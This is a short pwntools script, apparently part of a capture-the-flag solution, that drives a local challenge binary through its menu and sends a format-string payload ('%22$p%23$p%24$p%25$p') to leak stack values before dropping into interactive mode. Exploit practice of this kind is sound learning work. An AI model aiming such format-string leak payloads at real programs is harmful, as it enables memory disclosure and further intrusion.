from pwn import *

p = process('./chall')

p.sendlineafter(b'> ', b'2')
p.sendline(b'azod')
p.sendline(b'azod')

p.sendlineafter(b'> ', b'3')
p.sendline(b'3')
p.sendline(b'%22$p%23$p%24$p%25$p')



p.interactive()
